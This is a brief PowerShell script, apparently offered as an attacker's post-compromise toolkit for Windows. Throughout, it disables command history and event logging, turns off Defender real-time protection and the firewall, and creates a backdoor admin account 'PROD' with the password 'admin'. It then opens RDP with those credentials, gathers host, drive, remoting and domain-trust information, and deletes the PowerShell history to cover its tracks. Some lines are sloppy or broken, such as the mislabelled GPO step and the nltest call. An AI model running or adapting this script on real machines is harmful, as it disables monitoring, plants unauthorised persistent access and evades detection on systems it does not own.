<#PowerShell Script to do stuff
    Author: Daniel Krilich
    Legal: Don't dumb stuff with this, or do - you're liable not me
​
#>
​
# Disable PS-CMDLine logging
Remove-Module PSReadline
​
# Disable PSReadline history saving
Set-PSReadLineOption -HistorySavePath $null
Set-PSReadLineOption -HistorySaveStyle SaveNothing
Set-PSReadLineOption -MaximumHistoryCount 0
​
# Disable Event logging
Stop-Service -Name EventLog
​
# Disable real-time
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
​
# Disable firewall
netsh advfirewall set allprofiles state off
​
$computername = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -eq (Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).Name}).IPAddress
​
# Create GPO and user access with admin priv
$groupname = "MyAdminGroup"
$user = "PROD"
$password = ConvertTo-SecureString "admin" -AsPlainText -Force
​
# Create the group
New-LocalGroup -Name $groupname
​
# Add the user to the group
Add-LocalGroupMember -Group $groupname -Member $user
​
# Grant local admin privileges to the group
$group = [ADSI]("WinNT://./$groupname")
$group.Invoke("Add", "WinNT://$env:COMPUTERNAME/$user")
​
# Set the user's password
Set-LocalUser -Name $user -Password $password
​
# Windows PowerShell script to log into user "PROD" with credentials "admin" then uses mstsc /v:127.0.0.1
$UserName = "PROD"
$Password = ConvertTo-SecureString "admin" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ($UserName, $Password)
Start-Process mstsc.exe -ArgumentList "/v:127.0.0.1" -Credential $Credential # IP address would be what you want to remote into aka your remote IP not local
​
​
# Get computer information
Get-ComputerInfo
​
# Get drives in current session
Get-PSDrive
​
# Create a new persistent PSDrive
New-PSDrive -Persist -Name "X" -PSProvider "FileSystem" -Root "\\Server01\Public"
​
# Search IP address of the remote host you want to check
$session = New-PSSession -ComputerName $computerName -ErrorAction SilentlyContinue
​
if ($session -eq $null) {
    Write-Host "PowerShell Remoting is not enabled on $computerName"
} else {
    Write-Host "PowerShell Remoting is enabled on $computerName"
    Remove-PSSession $session
}
​
# Search for trusted domains
Start-Process nltest -c /trusted_domains
​
​
# Final remove of history of previous commands
Remove-Item (Get-PSReadlineOption).HistorySavePath